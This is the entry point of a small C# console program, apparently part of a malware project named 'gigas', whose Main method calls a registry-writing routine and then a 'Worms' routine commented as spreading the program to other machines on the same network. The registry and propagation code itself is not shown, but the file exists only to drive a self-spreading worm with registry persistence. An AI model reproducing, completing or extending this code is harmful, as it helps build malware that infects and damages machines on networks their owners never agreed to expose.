// See https://aka.ms/new-console-template for more information
using gigas.RegEdit;
using gigas.Worms;

namespace gigas;

public class Program
{
    static void Main(string[] args)
    {
        RegEdit.Write();
        // call the write function to write registry key to the registry
        
        Worms.Def();
        // attempt to spread itself to other machines on the same network.
    }
}

